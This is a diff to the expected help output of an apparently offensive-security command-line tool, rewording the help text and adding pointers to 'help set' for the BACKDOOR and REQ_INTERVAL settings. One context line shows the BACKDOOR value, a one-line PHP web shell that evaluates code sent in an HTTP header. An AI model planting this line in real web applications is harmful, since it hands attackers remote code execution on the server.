@@ -2,23 +2,22 @@
 [*] help: Show commands help
 
 SYNOPSIS:
-    help [<COMMAND>]
+    help
+    help <COMMAND>
+    help set <SETTING>
 
 DESCRIPTION:
-    Display help message for any command, including plugins.
+    Get help for any core command or plugin.
 
-    - Without arguments, the whole available commands, sorted
-      by category, are displayed including a summary line for
-      each one.
-
-    - For detailed help, the command should be given as
-      argument.
+    If called without arguments, a list of available commands,
+    plugins, and aliases is displayed.
+    Otherwise, detailed help of given command is shown.
 
 EXAMPLES:
     > help
-      - Display the full help, sorted by category
-    > help clear
-      - Display the help for the "clear" command
+      - Show available commands, plugins, and aliases
+    > help exit
+      - Display the help for the `exit` command
     > help set BACKDOOR
       - Display help about the "BACKDOOR" setting
 
@@ -32,6 +31,7 @@ Configuration Settings
     --------  -----
     BACKDOOR  <?php @eval($_SERVER['HTTP_%%PASSKEY%%']); ?>
 
+[*] For detailed help, run `help set BACKDOOR`
 
 Configuration Settings
 ======================
@@ -40,5 +40,6 @@ Configuration Settings
     --------      -----
     REQ_INTERVAL  1 <= x <= 10 (random interval)
 
+[*] For detailed help, run `help set REQ_INTERVAL`
 [#] CMD('set' 'VERBOSITY' 'TRUE'): Returned 0
 [#] CMD('set' 'VERBOSITY' 'FALSE'): Running...
